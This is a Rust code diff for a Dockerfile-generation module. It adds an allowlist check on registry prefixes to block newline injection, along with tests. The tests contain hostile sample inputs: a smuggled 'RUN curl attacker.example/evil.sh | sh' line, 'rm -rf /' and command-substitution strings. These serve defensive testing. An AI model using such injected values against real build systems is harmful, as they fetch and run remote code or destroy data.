@@ -44,6 +44,29 @@ pub fn is_docker_hub_image(image: &str) -> bool {
     !looks_like_registry_host
 }
 
+/// Returns `true` when `prefix` is safe to splice verbatim into a
+/// `FROM <prefix>/<image>` line.
+///
+/// A registry host+path is restricted to this allowlist in practice
+/// (alphanumerics, `.`, `-`, `_`, `:` for a port, `/` for path segments).
+/// Rejecting everything else — in particular any whitespace, since a bare
+/// `str::trim()` only strips *leading/trailing* whitespace and leaves an
+/// embedded `\n` untouched — is what actually closes the injection: an
+/// operator-controlled prefix containing a newline would otherwise land
+/// verbatim inside a generated Dockerfile and become a syntactically
+/// independent BuildKit instruction (e.g. a smuggled `RUN` line).
+///
+/// Public so the settings write path (`temps-config`) can reject a bad value
+/// at the API boundary with a clear 400, using the exact same rule this
+/// module enforces defense-in-depth at build time — one allowlist, not two
+/// that can drift apart.
+pub fn is_valid_registry_prefix(prefix: &str) -> bool {
+    !prefix.is_empty()
+        && prefix
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '/'))
+}
+
 /// Rewrite `image` through `prefix` if it is an implicit Docker Hub
 /// reference and a prefix is configured; otherwise return it unchanged.
 ///
@@ -52,10 +75,22 @@ pub fn is_docker_hub_image(image: &str) -> bool {
 /// image references — it does not expand the implicit `library/` namespace,
 /// since a proxy that accepts `<prefix>/gotempsh/temps` is expected to accept
 /// `<prefix>/node` the same way.
+///
+/// A malformed prefix (anything outside the registry host+path character
+/// set — most importantly, embedded whitespace/control characters) is
+/// treated exactly like an absent prefix rather than spliced in: this
+/// function has to stay fail-closed on its own, since it is the last line of
+/// defense before the value is written into a Dockerfile, independent of
+/// whatever validation ran (or didn't) when the value was saved.
 pub fn qualify_with_registry_prefix(image: &str, prefix: Option<&str>) -> String {
     match prefix.map(str::trim) {
         Some(prefix) if !prefix.is_empty() && is_docker_hub_image(image) => {
-            format!("{}/{}", prefix.trim_end_matches('/'), image)
+            let prefix = prefix.trim_end_matches('/');
+            if is_valid_registry_prefix(prefix) {
+                format!("{prefix}/{image}")
+            } else {
+                image.to_string()
+            }
         }
         _ => image.to_string(),
     }
@@ -145,6 +180,49 @@ mod tests {
         assert_eq!(
             qualify_with_registry_prefix("node:22-slim", Some("   ")),
             "node:22-slim"
+        );
+    }
+
+    #[test]
+    fn refuses_to_splice_a_prefix_containing_an_embedded_newline() {
+        // `str::trim()` only strips leading/trailing whitespace -- an
+        // embedded `\n` survives it and, if spliced into a generated
+        // Dockerfile, becomes a syntactically independent BuildKit
+        // instruction. This must never reach the output: fall back to the
+        // unmodified image exactly as if no prefix were configured.
+        let malicious = "registry.example.com\nRUN curl attacker.example/evil.sh | sh\nFROM registry.example.com";
+        assert_eq!(
+            qualify_with_registry_prefix("node:22-slim", Some(malicious)),
+            "node:22-slim"
+        );
+    }
+
+    #[test]
+    fn refuses_to_splice_a_prefix_containing_other_control_or_shell_metacharacters() {
+        for malicious in [
+            "registry.example.com\r\nFROM evil",
+            "registry.example.com\0",
+            "registry.example.com; rm -rf /",
+            "registry.example.com`whoami`",
+            "registry.example.com$(whoami)",
+            "registry.example.com\"",
+        ] {
+            assert_eq!(
+                qualify_with_registry_prefix("node:22-slim", Some(malicious)),
+                "node:22-slim",
+                "expected {malicious:?} to be rejected"
+            );
+        }
+    }
+
+    #[test]
+    fn accepts_a_well_formed_prefix_with_a_port_and_path() {
+        assert_eq!(
+            qualify_with_registry_prefix(
+                "node:22-slim",
+                Some("registry.example.com:5000/team_a/docker-mirror")
+            ),
+            "registry.example.com:5000/team_a/docker-mirror/node:22-slim"
         );
     }
 }
